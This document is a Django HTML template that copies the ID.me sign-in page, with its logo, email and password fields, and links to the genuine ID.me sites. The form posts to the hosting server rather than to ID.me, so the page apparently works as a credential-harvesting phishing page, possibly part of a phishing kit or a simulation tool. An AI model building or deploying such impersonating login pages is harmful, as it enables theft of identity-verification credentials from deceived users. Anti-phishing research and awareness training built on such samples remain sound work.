    <div id="ZN_2bLc7fWaOZ8U4ey"></div>
      <div class="page-container" data-role="page-container">
        <div class="container">
          <div class="content-container">
            <form class="new_user" id="new_user" data-validate="signin" accept-charset="UTF-8" method="post" novalidate="novalidate">
              {% csrf_token %}
              <div class="form-header">
                <div class="form-header-content" role="banner">
                  <div class="partner">
                    <div class="c_icon m_frontend/idme">
                      <img alt="ID.me" src="{% static 'frontend/idme/logo.png' %}" width="300">
                    </div>
                  </div>
                </div>
              </div>
              <main aria-labelledby="sr_page_title" class="form-container">
                <div class="form-header-access">
                  <h1 id="sr_page_title">Sign in to ID.me</h1>
                </div>
                <div class="form-header-well">
                  <p>New to ID.me?</p>
                  <p><a href="https://api.id.me/en/registration/new">Create an ID.me account</a></p>
                  {% include 'frontend/idme/messages.html' %}
                </div>

                <p class="alert alert-error" role="alert" style=""></p>
                <p class="alert alert-success" role="alert" style=""></p>

                <div class="form-fields">
                  <div class="field-group">

                    <div class="field text">
                      <label for="user_email">Email</label>
                      <input placeholder="Enter your email address" required="required" autocomplete="email" type="email" name="email" id="user_email">
                      <span role="alert"></span>
                    </div>

                  <div class="field text">
                    <label for="user_password">Password</label>
                    <input placeholder="Enter password" required="required" autocomplete="current-password" type="password" name="password" id="user_password">
                    <span role="alert"></span>
                  </div>

                <div class="field checkbox remember_me" data-component="Cookies.Delete" data-endpoint="/cookies/remember_me">
                  <input type="checkbox" name="remember_me" id="remember_me" value="true" aria-describedby="remember-me-tip">
                  <label for="remember_me">
                    <span aria-hidden="true" class="checkmark"></span>
                    <span> Remember me </span>
                    <div id="remember-me-tip">
                      For your security, select only on your devices.
                    </div>
                  </label>
                </div>

                </div>
                </div>
                <div class="form-actions">
                  <input type="submit" name="commit" value="Sign in" class="btn btn-primary">
                </div>
                <div class="form-footer">
                  <p><a href="https://api.id.me/en/passwords/new">Forgot password</a></p>
                </div>
              </main>
            </form>
          </div>

          <footer class="footer">
            <nav aria-label="Footer" class="footer__links">
              <ul class="footer__list">
              <li class="footer__list-item"><a target="_blank" class="footer__link" href="https://www.id.me/about">What is ID.me?</a></li>
              <li class="footer__list-item"><a target="_blank" class="footer__link" href="https://www.id.me/terms">Terms of Service</a></li>
              <li class="footer__list-item"><a target="_blank" class="footer__link" href="https://www.id.me/privacy">Privacy Policy</a></li>
              </ul>
            </nav>
          </footer>
